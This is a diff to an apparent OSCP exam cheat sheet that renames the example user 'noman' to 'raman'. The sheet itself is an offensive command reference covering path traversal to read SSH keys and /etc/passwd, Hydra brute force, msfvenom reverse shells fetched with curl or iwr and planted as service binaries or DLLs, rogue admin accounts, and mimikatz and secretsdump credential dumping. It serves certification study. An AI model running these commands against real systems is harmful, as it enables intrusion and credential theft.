@@ -101,10 +101,10 @@ after download files always use exiftool –u -a <filename> (Meta description fo
 
 Port 22 SSH:
 you can’t get initial access directly however we can login with user and password and private key.
--     ssh noman@ip
--     ssh -p 2222 noman@192.168.10.10 ( ssh use with different port )
--     curl http://<ip>/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa
--     chmod 600 id_rsa  and then ssh -i id_rsa -p 2222 noman@ip
+-     ssh raman@ip
+-     ssh -p 2222 raman@192.168.10.10 ( ssh use with different port )
+-     curl http://<ip>/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
+-     chmod 600 id_rsa  and then ssh -i id_rsa -p 2222 raman@ip
 -     user/.ssh/authorized key
 
 PORT 25 (relying server to server) 465 (mail client to server)
@@ -129,7 +129,7 @@ Then add that discovered domain in the /etc/hosts file to access the site.
 Content Discovery:
 -     gobuster dir -u http://192.168.10.10 -w  /wd/directory-list-2.3-big.txt (simple run)
 -     gobuster dir -u http://192.168.10.10:8000 -w  /wd/directory-list-2.3-big.txt (with different port)
--     gobuster dir -u http://192.168.10.10/noman -w  /wd/directory-list-2.3-big.txt (if you find noman then enumerate noman directory)
+-     gobuster dir -u http://192.168.10.10/raman -w  /wd/directory-list-2.3-big.txt (if you find raman then enumerate raman directory)
 With the help of content discovery, you will find hidden directories, CMS web logins, files, etc. This is a crucial step in OSCP.
 Utilizing content discovery and Nmap, you can identify CMS, static pages, dynamic websites, and important files like databases, .txt, .pdf, etc. Additionally, you can enumerate websites with automated tools such as WPScan, JoomScan, Burp Suite, and uncover web vulnerabilities like RCE, SQLi, upload functionality, XSS, etc.
 If you find any CMS like WordPress, Joomla, etc., simply search on Google for default credentials or exploits of theme, plugin, version etc. In the case of a login page, you can exploit SQL injection and launch a brute-force attack with Hydra. If you identify any CMS, scan it with tools, perform enumeration with brute force, check default usernames and passwords, explore themes, plugins, version exploits, and search on Google. Alternatively, you can discover web vulnerabilities to gain initial access.
@@ -217,7 +217,7 @@ IF LFI FOUND then start with
 -     ../../../../etc/passwd
 SSH keys are
 By default, SSH searches for id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa  | 
--     curl http://rssoftwire.com/noman/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa
+-     curl http://rssoftwire.com/raman/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
 with encode
 -     curl http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
@@ -229,21 +229,21 @@ It will get with autorecon (UDP Port)
 -     nmap -sU -p161 --script "snmp-*" $ip
 -     nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
 -     snmpwalk -v 1 -c public 192.168.10.10  NET-SNMP-EXTEND-MIB::nsExtendOutputFull (this is command I have used in 2 3 machine to find username, password, or hint of user and pass
--     evil-winrm -I 192.168.10.10 -u ‘noman’ -p ‘nomanpassword’  (login with this command)
+-     evil-winrm -I 192.168.10.10 -u ‘raman’ -p ‘ramanpassword’  (login with this command)
 PORT 139, port 445  (also PORT 137 (name services) & PORT 138 (datagam) UDP netbios)
 Always check guest login and then check public share with write and execute permission and you will find credential, files pdf ps1 etc
 -     nmap -v -script smb-vuln* -p 139,445 10.10.10.10
 -     smbmap -H 192.168.10.10   (public shares) (check read write and execute)
 -     smbmap -H 192.168.10.10 -R tmp   (check specific folder like tmp)
 -     enum4linux -a 192.168.10.10   (best command to find details and users list)
--     smbclient -p 4455 -L //192.168.10.10/ -U noman --password=noman1234
--     smbclient -p 4455 //192.168.10.10/scripts -U noman --password noman1234  (login)
+-     smbclient -p 4455 -L //192.168.10.10/ -U raman --password=raman1234
+-     smbclient -p 4455 //192.168.10.10/scripts -U raman --password raman1234  (login)
 Port 3389 RDP
 There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.
 There is only one method to find credentials on this port, which involves a brute force attack using Hydra
 -     hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
 then further login with xfreerdp
--     xfreerdp /v:noman /u:passwordnoman /p:192.168.10.10 /workarea /smart-sizing
+-     xfreerdp /v:raman /u:passwordraman /p:192.168.10.10 /workarea /smart-sizing
 -     rdesktop $ip
 PORT 3306 MySQL
 Find credential with other port and use default to login
@@ -253,8 +253,8 @@ Find credential with other port and use default to login
 MSSQL 1433, 4022, 135, 1434, UDP 1434
 For this port, you can find credentials from another port and log in with ipacket-mssqlclient
 -     nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
--     impacket-mssqlclient noman:'Noman@321@1!'@192.168.10.10
--     impacket-mssqlclient Administrator: 'Noman@321@1!'@192.168.10.10 -windows-auth
+-     impacket-mssqlclient raman:'raman@321@1!'@192.168.10.10
+-     impacket-mssqlclient Administrator: 'raman@321@1!'@192.168.10.10 -windows-auth
 -     SELECT @@version;  | SELECT name FROM sys.databases;  | SELECT  FROM offsec.information_schema.tables;  |  select  from offsec.dbo.users;
 Connect as CMD database
 -     SQL> EXECUTE sp_configure 'show advanced options', 1;
@@ -288,7 +288,7 @@ To find a password
 -     run winpeas
 -     check history with command
 -     check exe files in C or desktop etc
--     \users\noman\documents\fileMonitorBackup.log
+-     \users\raman\documents\fileMonitorBackup.log
 File Permission
 F> Full access | M> Modify access |RX> Read and execute access| R>Read-only access| W>Write-only
 -     icacls "C:\xampp\apache\bin\fida.exe"  (check permission)
@@ -307,8 +307,8 @@ Windpeas.exe If .net 4.5 (run otherwise)
 -     Hostname | Whoami | wmic qfe (updates and patches etc)
 -     Wmic logicaldisk (drives)
 -     echo %USERNAME% || whoami then $env:username
--     Net user | net user noman
--     Net localgroup | net localgroup noman
+-     Net user | net user raman
+-     Net localgroup | net localgroup raman
 -     netsh firewall show state (firewall)
 -     Whoami /priv
 -     Ipconfig | ipconfig /all  |
@@ -336,7 +336,7 @@ OR
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (findbackup file)
 Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue (check files) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
 Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue   (check doc txt etc)
-Another goldmine powershell Get-History   | (Get-PSReadlineOption).HistorySavePath (found file then type noman.txt and if found command then do it because of taken root
+Another goldmine powershell Get-History   | (Get-PSReadlineOption).HistorySavePath (found file then type raman.txt and if found command then do it because of taken root
 cd C:\ | pwd | dir
  SeImpersonatePrivilege enable
 Whoami /priv and Whoami /all
@@ -356,32 +356,32 @@ Get-ModifiableServiceFile
 •         Msfvenom create shell and upload ( curl, iwr, certutil)
 •         icacls "C:\Program Files"
 •         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
-•         del "C:\program files\noman\noman.exe"
-•         curl 192.168.10.10/rev.exe -o noman.exe
-•         cp noman.exe "C:\program files\noman\"
-•         net start noman
+•         del "C:\program files\raman\raman.exe"
+•         curl 192.168.10.10/rev.exe -o raman.exe
+•         cp raman.exe "C:\program files\raman\"
+•         net start raman
  unquoted path
 •         Get-UnquotedService
 •         Permission check and service stop / start check
 •         Msfvenom create shell and upload ( curl, iwr, certutil)
 •         icacls "C:\Program Files"
 •         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
-•         del "C:\program files\noman\noman.exe"
-•         curl 192.168.10.10/rev.exe -o noman.exe
-•         cp noman.exe "C:\program files\noman\"
-•         net start noman
+•         del "C:\program files\raman\raman.exe"
+•         curl 192.168.10.10/rev.exe -o raman.exe
+•         cp raman.exe "C:\program files\raman\"
+•         net start raman
 DLL Hijacking
 •         Permission check and service stop / start check
 •         Msfvenom create shell and upload ( curl, iwr, certutil)
 •         icacls "C:\Program Files"
 •         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll
-•         del "C:\program files\noman\noman.dll"
-•         curl 192.168.10.10/rev.dll -o noman.dll
-•         cp noman.dll "C:\program files\noman\"
-•         net start noman
+•         del "C:\program files\raman\raman.dll"
+•         curl 192.168.10.10/rev.dll -o raman.dll
+•         cp raman.dll "C:\program files\raman\"
+•         net start raman
  Task scduler/cron job
 ·         schtasks /query /fo LIST /v  (find taskName: \Microsoft\CacheCleanup)
-·         icacls C:\Users\noman\Pictures\Cleanup.exe    user (I)(F) permission required)
+·         icacls C:\Users\raman\Pictures\Cleanup.exe    user (I)(F) permission required)
 •         iwr -Uri http://192.168.10.10/adduser.exe -Outfile Cleanup.exe
 •         move .\Pictures\BackendCacheCleanup.exe Cleanup.exe.bak
 •         move .\Cleanup.exe .\Pictures\  (waiting for the execution and put file just one before the folder)
@@ -427,18 +427,18 @@ After get privilege escalation then run following commands
 ·         Found users account domain01  (if you find user then don’t use below step)
 ·         transfer bloodhound.zip on kali
 ·         Create a new user (if you want or change administrator password)
-·         net user noman Noman@321 /add
-·         net localgroup administrators noman /add
-·         net user administrator Noman@123 (password Changed of administrator)
+·         net user raman raman@321 /add
+·         net localgroup administrators raman /add
+·         net user administrator raman@123 (password Changed of administrator)
 ·         run secret dump or use mimikatz to find user and password on machine01
 ·         use impacket for secret dump https://github.com/fortra/impacket
-·         python3 ./secretsdump.py ./administrator: Noman@123@192.168.10.10 (check domain users with oscp.exam specially default username and password
+·         python3 ./secretsdump.py ./administrator: raman@123@192.168.10.10 (check domain users with oscp.exam specially default username and password
 ·         for MimiKatz   privilege::debug | token::elevate | sekurlsa::logonpasswords
 Machine02
 The first step is to start port forwarding, followed by running AS-REP Roasting with GetUserSPNs.py for Linux and Rubeus.exe for Windows. If neither method works, manually enumerate in Windows to find the username and password or again use mimikatz. If you are not an administrator, apply Windows privilege escalation techniques on it. This will help you gain privileges on Machine02.
 ·         run map on Macine02 with proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 10.10.10.10
 Port Forward with SSH   (if port 22 is open in machine01)
-·         ssh -D 8001 -C -q -N noman@192.168.10.10
+·         ssh -D 8001 -C -q -N raman@192.168.10.10
 ·         in /etc/proxychains4.conf  (add 127.0.0.1 9999)
 ·         socks5 127.0.0.1 8001
 Port Forward with chisel
@@ -454,7 +454,7 @@ WINDOW Kerberoasting with window Machine02
 OR
 ./GetUserSPNs.py  For Macine02 
 ·         make user firewall if off and you are local admin etc)
-·         proxychains python3 impacket-GetNPUsers oscp.exam/noman:Noman@123 -dc-ip 10.10.100.100
+·         proxychains python3 impacket-GetNPUsers oscp.exam/raman:raman@123 -dc-ip 10.10.100.100
 ·         sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force
 If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm, check the administrator, then move to the next step to find the Windows root. If you find a lot of username and password then use crackmapexec for SMB, SQL, WinRm or evil-winrm
 Domain01
@@ -472,8 +472,8 @@ admin:admin admin:password root:root root:toor
 Burpsuite if we want to
 john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
 sudo gzip -d rockyou.txt.gz
-hydra -l noman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
-hydra -l noman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post
+hydra -l raman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10
+hydra -l raman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 hashcat -b    | hashcat.exe -b    (linux and window  benchmark)
 customize wordlists
@@ -484,7 +484,7 @@ hashid    (if id is available "$2y$10$)
 ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh"    (port22)
 CRACK NTLM with MimiKatz 
 TargetWindow Get-LocalUser | open powershell | cd C:\tools | ls (| already install if not then install it) | token::elevate (check user permission) | lsadump::sam (dump all user ntlm) |
-KALI vim noman.hash (copy noman hash) | hashcat --help | grep -i "ntlm" (check mode like ntml 1000 value) | hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+KALI vim raman.hash (copy raman hash) | hashcat --help | grep -i "ntlm" (check mode like ntml 1000 value) | hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 Zip cracking
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
 zip2john file.zip > zip.john
